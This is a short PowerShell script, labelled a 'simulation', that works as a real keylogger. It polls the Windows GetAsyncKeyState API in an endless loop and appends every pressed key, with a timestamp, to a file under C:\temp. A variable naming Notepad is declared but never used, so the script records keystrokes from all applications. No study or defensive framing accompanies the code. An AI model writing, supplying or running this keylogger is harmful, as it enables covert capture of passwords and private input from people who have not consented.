# PowerShell Script to Monitor Keystrokes and Log to File (Simulation)
$logFile = "C:\temp\strokelogger.md"
$windowTitle = "Notepad"

# Create the temp directory if it doesn't exist
If (!(Test-Path -Path "C:\temp")) {
    New-Item -ItemType Directory -Path "C:\temp"
}

# Loop to monitor for key presses
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
}
"@

while ($true) {
    Start-Sleep -Milliseconds 100
    # Check each key (ASCII 8-222)
    For ($ascii = 8; $ascii -le 222; $ascii++) {
        $state = [User32]::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
            $key = [char]$ascii
            Add-Content -Path $logFile -Value "$(Get-Date) - $key"
        }
    }
    # Break out with Ctrl+C
}
